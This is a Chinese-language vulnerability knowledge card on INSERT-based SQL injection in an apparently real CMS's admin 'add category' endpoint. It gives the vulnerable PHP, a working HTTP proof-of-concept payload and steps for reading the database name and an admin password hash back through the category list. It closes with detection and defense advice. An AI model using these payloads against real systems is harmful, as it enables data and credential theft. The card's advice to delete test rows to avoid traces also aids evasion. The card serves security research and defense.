---
id: web-generic-sqli-insert-visible-field-function-readback
title: INSERT 注入无结果集时把函数结果写进可见字段再回读：新增分类处 database() 落库后列表显示库名
type: scenario
domain: web
path: web/generic/sqli
technique: insert-injection-visible-field-function-readback
aliases:
- insert 注入回显
- database() 写字段回读
- 新增分类 SQL 注入
- 插入型注入取数
- RapidCMS 注入
- 盲注替代通道
tags:
- sqli
- insert
- mysql
- php
- exfiltration
- readback
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V392
  verified_at: '2026-11-09T11:30:26+08:00'
  notes: 已对照原文全文与全部42图核对：cate-add-run.php 的 INSERT 拼接（图20）、POST id=d7Xv5tKR7z",database(),1,1)-- 返回增加成功（图21）、分类列表 name 显示 rapidcms（图22）均一致；rawurlencode 只作用于 name、id 未过滤，构造成立。注意：一句话结论把 DELETE 也列入「无结果集可回显」场景，但 DELETE 无写入值，实际仅 INSERT/UPDATE 适用（正文触发条件已限定），属措辞过宽不影响核心手法。与 xinhu insert 时间盲注卡（不同取数通道）及 UNION 卡均不同，dedup new 成立。PoC 未在本机执行。frontmatter 无 sources/source_url/文章ID。
---

## 一句话结论

INSERT/UPDATE/DELETE 语句本身没有结果集可回显时，并非只能时间盲注：只要注入点写入的值之后会在列表/详情页被展示，就可以把 `database()`、`user()` 或标量子查询 `(select ...)` 当成插入值写进该字段，正常提交后打开列表页读取查询结果，一次请求完成取数。

## 原理

- **代码形态**：后台新增分类接口把表单字段直接拼进 INSERT，例如
  ```php
  $str = 'INSERT INTO `rapidcmscategory` (`id`,`name`,`pic`,`num`)
          VALUES ("'.$_POST["id"].'","'.rawurlencode($_POST["name"]).'","'.$_POST["pic"].'","'.$_POST["num"].'")';
  ```
  `id` 参数未过滤，且 SQL 字面量使用双引号（MySQL 默认模式下双引号也是字符串）。
- **注入构造**：提交 `id=d7Xv5TkR7z",database(),1,1)--` 后语句变为
  ```sql
  INSERT INTO `rapidcmscategory` (`id`,`name`,`pic`,`num`)
  VALUES ("d7Xv5TkR7z",database(),1,1)--","a","1","1")
  ```
  `database()` 被当作第二列 `name` 的值写入，`--` 注释掉剩余部分。
- **回读通道**：这条记录随后出现在“分类列表”里，`name` 字段原样渲染，于是页面显示库名（示例显示 `rapidcms`）。INSERT 请求的响应不需要携带任何查询结果，甚至可以不看响应，取数发生在“写库 → 页面读取展示”这一业务闭环里。
- **为什么成立**：SQL 函数/子查询在 INSERT 时求值，结果作为普通列值持久化；应用认为该列是“用户填写的名称”，展示时不会再做来源校验。攻击者因此把“写字段”当成带外通道。
- **与其它注入通道的区别**：
  - 时间盲注（`sleep()`）需要每次请求等待并推断，慢且受超时限制；
  - 报错注入依赖后端把 SQL 错误回显；
  - 本手法在“写入成功、页面可读”时最直接，适合后台新增/编辑类接口。
- **限制**：写入值需满足字段类型/长度；若字段有唯一约束或触发器改写值，结果可能丢失；列表页需展示该字段给攻击者（或攻击者能通过导出/API 读到）；若写入后需要审核才展示，需等审核。

## 触发条件

- 存在可访问的 INSERT（或 UPDATE）接口，参数直接拼进 SQL，没有参数化/转义。
- 注入值会被持久化，并在之后的页面/接口中展示给攻击者（列表、详情、导出、搜索回显等）。
- 攻击者具备调用该接口的权限（示例为后台管理员会话）。
- 数据库支持所用函数/子查询（MySQL 的 `database()`、`user()`、`version()`、`(select ...)`）。

## 利用步骤

1. 审计/抓包定位 INSERT 接口与拼接字段，确认哪些参数进入 `VALUES`，以及列与字段的对应关系。
2. 判断哪个列会在页面展示（示例 `name` 显示在分类列表）。
3. 构造 payload：在可注入列处闭合字符串，把函数放在“可见列”的位置，其余列用合法值补齐，最后 `--` 注释尾部。
4. 提交后打开对应列表/详情页读取结果；示例 payload `id=d7Xv5TkR7z",database(),1,1)--` 会在分类名处显示数据库名。
5. 换用 `user()`、`version()`、`@@datadir`，或标量子查询 `(select password from rapidcmsadmin limit 1)` 逐条取数；多值可用 `concat()`/`group_concat()`。
6. 取数后清理插入的测试行，避免留下痕迹或影响业务。

## PoC

```http
POST /admin/cate-add-run.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

id=d7Xv5TkR7z",database(),1,1)--&name=a&pic=1&num=1
```

```sql
-- 实际拼出的语句（MySQL 双引号字面量）
INSERT INTO `rapidcmscategory` (`id`,`name`,`pic`,`num`)
VALUES ("d7Xv5TkR7z",database(),1,1)--","a","1","1")
-- 插入行的 name 列 = database()，随后在分类列表显示为 rapidcms
```

```text
回读：打开“查看分类”页面，新增行的名称列显示 database() 的返回值；
换成 (select password from rapidcmsadmin limit 1) 可读取管理员口令哈希。
```

## 变体与关联

- **UPDATE 变体**：`UPDATE ... SET name="<function>" WHERE id=...` 把函数结果写进可见列，再从详情页回读，绕过 UPDATE 无结果集的问题。
- **多值/长数据变体**：`concat((select ...),0x7c,(select ...))`、`group_concat()`；受列长度限制时分段读取。
- **无展示字段时**：回到时间盲注/报错注入；插入型时间盲注示例见 [[web-generic-sqli-xinhu-getmfilv-fname-base64-insert]]；UPDATE SET 子句追加赋值见 [[web-generic-sqli-update-set-clause-extra-assignment]]；DELETE 型见九垠赢/泛微等删除型注入卡。
- **边界**：字段类型/长度不匹配、列有严格校验、插入后需人工审核、列表不展示该列、或接口使用参数化查询时，本通道失效。

## 检测与防御

- **检测**：INSERT/UPDATE 请求参数中出现 `"`/`'`、`database(`、`user(`、`version(`、`select`、`--`、`#` 等片段；数据库中新增行的字段值出现库名、用户名、哈希等非业务内容；短时间内产生异常测试行。
- **防御**：所有 SQL 使用参数化查询/预处理；字段白名单与类型转换（如 id 强制转字符串/整型）；插入接口做输入校验与长度限制；对后台接口加 CSRF 防护与操作审计。
- **加固**：数据库账号最小权限；对新增/修改操作记录操作者与内容；列表输出做 HTML 编码（防止把注入值当 HTML 渲染导致 XSS 叠加）。
